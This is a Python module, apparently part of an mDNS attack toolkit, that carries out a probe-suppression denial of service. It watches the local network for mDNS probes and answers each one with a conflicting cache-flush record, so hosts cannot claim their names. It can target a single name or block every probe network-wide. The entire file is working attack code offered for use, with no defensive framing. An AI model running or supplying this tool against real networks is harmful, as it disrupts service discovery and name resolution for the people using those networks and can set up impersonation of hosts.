"""
probe_dos.py - Probe suppression and denial of service.

Prevents hosts from registering names by conflicting every probe.
Can target a specific name or block ALL probes network-wide.
"""

import time
import sys

sys.path.insert(0, __file__.rsplit("/", 2)[0])
from mdns_core import (make_mdns_socket, send_mdns, recv_mdns, parse_packet,
                       build_response, rdata_a, A, CACHE_FLUSH, ANY)


def block_all_probes(our_ip: str, iface: str | None = None, duration: int = 120):
    """
    Block ALL mDNS probes on the network.

    Monitors for any query with records in the authority section (probe indicator)
    and immediately responds with a conflicting record using a high IP address
    to win tiebreaks.
    """
    sock = make_mdns_socket(iface)

    print(f"[*] Blocking ALL mDNS probes (duration={duration}s)")
    print(f"[*] Conflict IP: {our_ip}")

    start = time.time()
    blocked = 0

    try:
        while time.time() - start < duration:
            result = recv_mdns(sock, timeout=0.5)
            if result is None:
                continue
            data, (src_ip, _) = result
            pkt = parse_packet(data)
            if not pkt or pkt["is_response"]:
                continue

            # Detect probes: queries with authority section records
            if pkt["authority"]:
                for auth in pkt["authority"]:
                    name = auth["name"]
                    # Send conflicting response
                    resp = build_response(name, A, rdata_a(our_ip),
                                          ttl=120, cache_flush=True)
                    send_mdns(sock, resp)
                    blocked += 1
                    print(f"  [{blocked}] Blocked probe from {src_ip} for {name}")
    except KeyboardInterrupt:
        pass

    print(f"\n[*] Blocked {blocked} probes in {time.time()-start:.0f}s")
    sock.close()


def block_specific(target_name: str, our_ip: str, iface: str | None = None,
                   duration: int = 120):
    """Block probes for a specific name only."""
    sock = make_mdns_socket(iface)
    target = target_name.lower().rstrip(".") + "."

    print(f"[*] Blocking probes for {target_name} (duration={duration}s)")

    start = time.time()
    blocked = 0

    try:
        while time.time() - start < duration:
            result = recv_mdns(sock, timeout=0.5)
            if result is None:
                continue
            data, (src_ip, _) = result
            pkt = parse_packet(data)
            if not pkt or pkt["is_response"]:
                continue

            hit = False
            for q in pkt["questions"]:
                if q["name"].lower() == target:
                    hit = True
            for auth in pkt["authority"]:
                if auth["name"].lower() == target:
                    hit = True

            if hit:
                resp = build_response(target_name, A, rdata_a(our_ip),
                                      ttl=120, cache_flush=True)
                send_mdns(sock, resp)
                blocked += 1
                print(f"  [{blocked}] Blocked probe from {src_ip}")
    except KeyboardInterrupt:
        pass

    print(f"\n[*] Blocked {blocked} probes")
    sock.close()


def run(our_ip: str, target: str | None = None, iface: str | None = None,
        duration: int = 120):
    if target:
        block_specific(target, our_ip, iface, duration)
    else:
        block_all_probes(our_ip, iface, duration)
